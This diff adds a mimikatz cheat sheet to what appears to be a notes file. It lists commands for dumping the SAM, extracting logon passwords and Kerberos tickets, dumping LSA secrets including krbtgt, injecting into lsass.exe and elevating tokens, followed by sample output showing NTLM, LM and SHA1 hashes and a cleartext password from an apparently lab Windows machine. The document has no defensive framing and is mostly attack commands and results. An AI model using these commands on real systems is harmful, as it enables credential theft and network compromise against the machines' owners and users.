@@ -1,9 +1,192 @@
 
+- mimikatz # system::user
+- mimikatz # system::computer
+- mimikatz # Crypto listProviders
+- mimikatz # Crypto listStores CERT_SYSTEM_STORE_LOCAL_MACHINE
+- mimikatz # Crypto listCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE Root
+- mimikatz # Crypto listKeys
+- mimikatz # samdump::bootkey
 - mimikatz # privilege::debug
 - mimikatz # sekurlsa::logonpasswords
 - mimikatz # sekurlsa::tickets /export
 - mimikatz # kerberos::list /export
+- mimikatz # inject::process lsass.exe sekurlsa.dll
+- mimikatz # inject::pid lsass.exe sekurlsa.dll
 
+
+- mimikatz # lsadump::sam
+- mimikatz # lsadump::lsa /id:500
+- mimikatz # lsadump::lsa /inject /name:krbtgt
+- mimikatz # lsadump::lsa /patch
+- mimikatz # privilege::debug
+- token::whoami
+- token::elevate
+- mimikatz # lsadump::sam SystemBkup.hiv SamBkup.hiv
+
+[Samples]
+
+mimikatz # lsadump::sam
+Domain : W7-PC
+SysKey : a2fc0cdcf364032e97248feb9d88b66a
+Local SID : S-1-5-21-4143378816-2706433924-1685450628
+
+SAMKey : 1287c538b54d85967dfaf4035f48c742
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   : 
+NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0
+
+RID  : 000001f5 (501)
+User : Guest
+LM   : 
+NTLM : 
+
+RID  : 000003e8 (1000)
+User : w7
+LM   : 
+NTLM : 819bf5b3240a3a66ee5cb82917ff1dd2
+
+RID  : 000003e9 (1001)
+User : ksanchez
+LM   : 
+NTLM : 608107e444136f9aab331d3f00a72c22
+
+------------------------------------------
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 367722 (00000000:00059c6a)
+Session           : Interactive from 1
+User Name         : w7
+Domain            : w7-PC
+Logon Server      : W7-PC
+Logon Time        : 7/13/2016 10:56:04 AM
+SID               : S-1-5-21-4143378816-2706433924-1685450628-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * LM       : 7775a6099dadd30b95873f3421ecab49
+	 * NTLM     : 819bf5b3240a3a66ee5cb82917ff1dd2
+	 * SHA1     : 7f78f1ddfc70a8357ff9ca5c98d5010b276478f8
+	tspkg :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	wdigest :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	kerberos :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 367693 (00000000:00059c4d)
+Session           : Interactive from 1
+User Name         : w7
+Domain            : w7-PC
+Logon Server      : W7-PC
+Logon Time        : 7/13/2016 10:56:04 AM
+SID               : S-1-5-21-4143378816-2706433924-1685450628-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * LM       : 7775a6099dadd30b95873f3421ecab49
+	 * NTLM     : 819bf5b3240a3a66ee5cb82917ff1dd2
+	 * SHA1     : 7f78f1ddfc70a8357ff9ca5c98d5010b276478f8
+	tspkg :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	wdigest :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	kerberos :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/13/2016 9:40:01 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : W7-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/13/2016 9:40:01 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : W7-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : w7-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 21386 (00000000:0000538a)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/13/2016 9:40:00 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : W7-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/13/2016 9:40:00 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : W7-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : w7-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :
 
 https://github.com/gentilkiwi/mimikatz
 http://blog.gentilkiwi.com/mimikatz
